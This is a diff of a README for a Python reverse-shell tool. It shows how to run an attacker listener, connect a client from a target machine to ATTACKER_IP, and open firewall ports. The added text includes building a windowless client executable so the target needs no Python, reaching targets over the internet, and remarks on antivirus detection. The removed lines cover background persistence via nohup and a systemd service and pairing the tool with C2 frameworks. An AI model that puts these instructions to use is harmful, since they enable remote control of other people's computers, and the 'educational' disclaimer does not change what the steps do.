@@ -27,9 +27,6 @@ By using this tool, you agree that you are solely responsible for how it is used
 reverse-shell/
 ├── server.py          # Attacker/listener (run on your machine)
 ├── client.py          # Target/connector (run on remote machine)
-├── server_threaded.py # Threaded version for better responsiveness
-├── server_simple.py   # Minimal server implementation
-├── client_simple.py   # Minimal client implementation
 └── README.md          # This documentation
 ```
 
@@ -55,66 +52,68 @@ reverse-shell/
 
 ## 🚀 **Usage Guide**
 
-### **Basic Usage**
+### **Step 1: Find Your Attacker IP Address**
 
-**Step 1: Start the listener (on attacker machine)**
+Before starting, you need to know the IP address of the attacker machine:
+
+#### **On Windows (Attacker Machine):**
+```cmd
+ipconfig
+```
+Look for the IPv4 address under your active network adapter (usually Wi-Fi or Ethernet). It will look like `192.168.x.x` or `10.x.x.x`.
+
+**Example output:**
+```
+Wireless LAN adapter Wi-Fi:
+   IPv4 Address. . . . . . . . . . . : 192.168.1.100  ← USE THIS IP
+   Subnet Mask . . . . . . . . . . . : 255.255.255.0
+```
+
+#### **On Linux/Mac (Attacker Machine):**
 ```bash
-# Default IP (will show available IPs)
+ifconfig
+# or
+ip addr show
+```
+
+### **Step 2: Start the Listener (Attacker Machine)**
+
+```bash
+# Method 1: Use default settings (will show available IPs)
 python server.py
 
-# Specify IP and port
+# Method 2: Specify your IP manually
+python server.py YOUR_IP_ADDRESS
+
+# Method 3: Specify IP and custom port
+python server.py YOUR_IP_ADDRESS 4444
+```
+
+**Example:**
+```bash
 python server.py 192.168.1.100 9001
-
-# Use threaded version for better performance
-python server_threaded.py
 ```
 
-**Step 2: Run the client (on target machine)**
+### **Step 3: Run the Client (Target Machine)**
+
 ```bash
-# Connect to attacker
-python client.py 192.168.1.100
+# Connect to the attacker's IP
+python client.py ATTACKER_IP_ADDRESS
 
-# Specify port (if not default 9001)
-python client.py 192.168.1.100 4444
-
-# Minimal version
-python client_simple.py
+# With custom port
+python client.py ATTACKER_IP_ADDRESS 4444
 ```
 
-### **Finding Your IP Address**
-
-**On attacker machine:**
+**Example:**
 ```bash
-# Linux/Mac
-ifconfig
-ip addr show
-
-# Windows
-ipconfig
-
-# Using Python
-python -c "import socket; print(socket.gethostbyname(socket.gethostname()))"
+python client.py 192.168.1.100 9001
 ```
-
-Common IP ranges:
-- `192.168.x.x` - Home/office networks
-- `10.x.x.x` - Corporate networks
-- `172.16.x.x` - Docker/WSL networks
-
-### **Network Scenarios**
-
-| Scenario | Attacker IP | Target Command |
-|----------|------------|----------------|
-| Same WiFi | `192.168.1.100` | `client.py 192.168.1.100` |
-| WSL to Windows | `172.17.144.1` | `client.py 172.17.144.1` |
-| Local testing | `127.0.0.1` | `client.py 127.0.0.1` |
-| Over Internet* | Your public IP | `client.py [PUBLIC_IP]` |
-
-*Requires port forwarding on router
 
 ## 📖 **Command Reference**
 
-### **Server Commands**
+### **Basic Commands**
+Once connected, you can execute commands on the target machine:
+
 ```
 shell> whoami          # Check current user
 shell> ipconfig        # Network info (Windows)
@@ -126,147 +125,125 @@ shell> pwd             # Print working directory
 shell> exit            # Close connection
 ```
 
-### **Special Features**
-- **Auto-reconnect**: Client automatically reconnects if connection drops
-- **Command timeout**: Commands timeout after 30 seconds to prevent hanging
-- **Error handling**: Clear error messages for debugging
-- **Platform detection**: Automatically uses correct shell (cmd.exe vs /bin/bash)
+### **Network Scenarios**
 
-## 🔒 **Security Considerations**
+| Scenario | How to Connect |
+|----------|----------------|
+| **Same WiFi Network** | Use the WiFi IP from `ipconfig` |
+| **Same Ethernet Network** | Use the Ethernet IP from `ipconfig` |
+| **WSL to Windows** | Use the WSL IP (usually 172.x.x.x) |
+| **Local Testing** | Use `127.0.0.1` or `localhost` |
+| **Over Internet** | Requires port forwarding and public IP |
 
-### **Firewall Configuration**
-You may need to allow the port through your firewall:
+## 🔒 **Security & Firewall Configuration**
 
-**Windows:**
+### **Allow Port Through Firewall**
+
+**Windows Firewall:**
 ```cmd
-netsh advfirewall firewall add rule name="Python Reverse Shell" dir=in action=allow protocol=TCP localport=9001
+# Open Command Prompt as Administrator
+netsh advfirewall firewall add rule name="Reverse Shell" dir=in action=allow protocol=TCP localport=9001
 ```
 
-**Linux:**
+**Linux Firewall:**
 ```bash
 sudo ufw allow 9001/tcp
-# or
-sudo iptables -A INPUT -p tcp --dport 9001 -j ACCEPT
 ```
 
 ### **Encryption Warning**
 ⚠️ **This tool sends data in plaintext!**
 - Commands and output are not encrypted
 - Use only on trusted, isolated networks
-- For production or sensitive environments, implement SSL/TLS encryption
+- For sensitive environments, consider adding SSL/TLS
 
 ## 🛠️ **Troubleshooting**
 
-### **Common Issues**
+### **Common Issues & Solutions**
 
-**"Connection refused"**
-- Server isn't running
-- Wrong IP address
-- Firewall blocking connection
-- Port already in use
+1. **"Connection refused"**
+   - Make sure server is running: `python server.py YOUR_IP`
+   - Check if IP address is correct
+   - Verify firewall isn't blocking port 9001
 
-**"Can't type after first command"**
-- Use the threaded version: `server_threaded.py`
-- Or add timeout: `client.settimeout(2.0)`
+2. **"Can't type after first command"**
+   - This version has fixed the issue
+   - If problems persist, press Enter once to refresh prompt
 
-**"No output received"**
-- Check if command actually produces output
-- Try simple commands first: `whoami`, `echo test`
-- Check client's network connectivity
+3. **"No output received"**
+   - Try simple commands first: `echo test`, `whoami`
+   - Check target machine's network connectivity
+   - Verify Python is installed on target
 
-**"Permission denied"**
-- Client may be running with limited privileges
-- Try running as administrator/root if needed
+4. **Testing Connectivity**
+   ```bash
+   # From target machine, test if port is open:
+   telnet ATTACKER_IP 9001
+   # or
+   python -c "import socket; s=socket.socket(); s.connect(('ATTACKER_IP',9001)); print('Connected')"
+   ```
 
-### **Testing Connectivity**
+### **Local Testing First**
+Test everything works locally before trying over network:
 
-**From target to attacker:**
+**Terminal 1 (Server):**
 ```bash
-# Test if port is open
-telnet [ATTACKER_IP] 9001
-# or
-nc -zv [ATTACKER_IP] 9001
-
-# Test with Python
-python -c "import socket; s=socket.socket(); s.connect(('[ATTACKER_IP]',9001)); print('Connected')"
+python server.py 127.0.0.1
 ```
 
-## 🧪 **Testing & Development**
+**Terminal 2 (Client):**
+```bash
+python client.py 127.0.0.1
+```
 
-### **Local Testing**
-Test everything locally first:
+## 🧪 **Advanced Usage**
 
-1. **Terminal 1 (server):**
-   ```bash
-   python server.py 127.0.0.1
-   ```
+### **Custom Ports**
+```bash
+# Server on custom port
+python server.py YOUR_IP 4444
 
-2. **Terminal 2 (client):**
-   ```bash
-   python client.py 127.0.0.1
-   ```
+# Client connecting to custom port
+python client.py ATTACKER_IP 4444
+```
 
-### **Building Executables**
-Create standalone executables (no Python needed on target):
+### **Finding All Available IPs**
+Create a `find_ip.py` script:
+```python
+import socket
+hostname = socket.gethostname()
+local_ip = socket.gethostbyname(hostname)
+print(f"Your IP address: {local_ip}")
+```
+
+### **Building Standalone Executables**
+Create executables so target doesn't need Python:
 
 ```bash
 # Install PyInstaller
 pip install pyinstaller
 
-# Build client
+# Build client executable
 pyinstaller --onefile --noconsole client.py
 
-# Build server
-pyinstaller --onefile server.py
+# Executable will be in dist/ folder
 ```
-
-Executables will be in the `dist/` folder.
 
 ## 📚 **How It Works**
 
 ### **Technical Overview**
 1. **Server** binds to a port and listens for incoming connections
 2. **Client** connects to the server's IP and port
-3. **Command loop**:
+3. **Command Loop**:
    - Server sends commands to client
    - Client executes commands locally
    - Client sends output back to server
    - Server displays output to user
 
-### **Key Components**
-- **Socket Programming**: TCP sockets for reliable communication
-- **Subprocess Module**: Secure command execution
-- **Platform Detection**: OS-specific command handling
-- **Error Recovery**: Auto-reconnection logic
-
-## ⚡ **Advanced Usage**
-
-### **Custom Ports**
-```bash
-# Server on custom port
-python server.py 0.0.0.0 4444
-
-# Client connecting to custom port
-python client.py [IP] 4444
-```
-
-### **Background Execution**
-**Linux/Mac client:**
-```bash
-# Run in background
-nohup python client.py [IP] > /dev/null 2>&1 &
-
-# As a service
-sudo cp client.py /usr/local/bin/
-sudo systemctl create reverse-shell.service
-```
-
-### **Integration with Other Tools**
-Can be integrated with:
-- Metasploit Framework
-- Cobalt Strike
-- Custom C2 frameworks
-- Monitoring systems
+### **Key Features**
+- **Auto-reconnect**: Client reconnects automatically if connection drops
+- **Platform detection**: Uses correct shell for Windows/Linux
+- **Timeout handling**: Commands timeout after 30 seconds
+- **Error recovery**: Graceful handling of connection issues
 
 ## 🤝 **Contributing**
 
@@ -281,7 +258,6 @@ Found a bug or have a feature request?
 - [ ] File transfer capabilities
 - [ ] Multiple client support
 - [ ] Web-based interface
-- [ ] Built-in port scanner
 
 ## 📄 **License**
 
@@ -289,31 +265,31 @@ This project is for educational purposes only. Users are solely responsible for 
 
 ## ❓ **FAQ**
 
-**Q: Does this work over the internet?**
+**Q: How do I find my IP address?**
+A: Run `ipconfig` on Windows or `ifconfig` on Linux/Mac. Look for IPv4 address.
+
+**Q: Can this work over the internet?**
 A: Yes, but you need port forwarding on your router and to use your public IP.
 
 **Q: Is this detectable by antivirus?**
-A: Python scripts are often flagged. Compiled executables may be detected as malware.
+A: Python scripts may be flagged. Compiled executables have higher detection rates.
 
-**Q: Can I use this on my company's network?**
-A: Only with explicit written permission from network administrators.
-
-**Q: Why does the connection drop?**
-A: Network issues, firewalls, or timeout settings. The auto-reconnect should handle this.
-
-**Q: How do I stop it?**
+**Q: How do I stop the connection?**
 A: Type `exit` on server, or Ctrl+C on both ends.
+
+**Q: Why use port 9001?**
+A: It's a common non-standard port. You can use any available port (4444, 8080, etc.).
 
 ## 🆘 **Support**
 
-For issues and questions:
-1. Check the troubleshooting section
-2. Review code comments
-3. Test with the simple versions first
-4. Ensure network connectivity
+For issues:
+1. Check the troubleshooting section above
+2. Test with localhost first
+3. Ensure correct IP addresses are used
+4. Check firewall settings
 
 ---
 
-**Remember**: With great power comes great responsibility. Use this knowledge ethically and legally.
+**Remember**: Use this tool responsibly and only on systems you own or have permission to test.
 
 *Last Updated: 2024*
